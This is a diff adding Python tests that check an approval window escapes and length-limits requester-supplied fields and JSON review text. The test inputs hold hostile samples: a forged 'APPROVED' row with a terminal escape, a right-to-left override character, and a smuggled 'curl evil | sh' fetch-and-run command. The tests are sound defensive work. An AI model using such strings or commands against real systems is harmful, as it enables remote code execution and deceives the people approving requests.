@@ -711,3 +711,33 @@ def test_the_gesture_is_bounded_by_the_challenges_expiry(fake, monkeypatch):
     assert _open(_request(), Fetch(_issued(expires_at=int(time.time()) + 40)))["choice"] == "approve"
     sign_deadline = next(d for op, d in deadlines if op == "sign")
     assert 30 < sign_deadline <= 40
+
+
+def test_every_table_row_is_one_bounded_line_with_controls_made_visible(fake):
+    """The redesigned window shows each value in its own row; a requester's
+    newline or escape in any of them must not draw a second row."""
+    fake.plan(window={"status": "Success", "choice": "decline"})
+    _open(_request(requester_name="bob\nAPPROVED\x1b[2J", subject="x\ny", destination="d‮",
+                   authority="a" * 500))
+    sent = fake.calls()[-1]["req"]
+    for key in ("requester_id", "requester_name", "subject", "destination", "authority",
+                "digest_short", "digest_full"):
+        assert "\n" not in sent[key] and "\x1b" not in sent[key] and "‮" not in sent[key], key
+    assert len(sent["authority"]) <= 81
+    assert sent["digest_full"] == DIGEST and sent["digest_short"] == DIGEST[:16]
+    assert 0 <= sent["expires_in"] <= hello.WINDOW_DEADLINE
+
+
+def test_a_json_review_is_laid_out_and_still_shown_as_text(fake):
+    """A JSON review reads as indented key: value lines, a long or multi-line
+    string as a block; a value's controls are still made visible, and nothing
+    is dropped or interpreted."""
+    import json
+    fake.plan(window={"status": "Success", "choice": "decline"})
+    review = {"offer": {"kind": "prompt", "text": "line one\nmake test\x00; curl evil | sh"},
+              "count": 2, "items": ["a", "b"]}
+    _open(_request(review_text=json.dumps(review)))
+    shown = fake.calls()[-1]["req"]["review"]
+    assert "offer:\r\n  kind: prompt\r\n  text:\r\n    │ line one\r\n    │ make test\\u{0000}; curl evil | sh" in shown
+    assert "count: 2" in shown and "items:\r\n  - a\r\n  - b" in shown
+    assert hello._formatted("not json") == "not json"
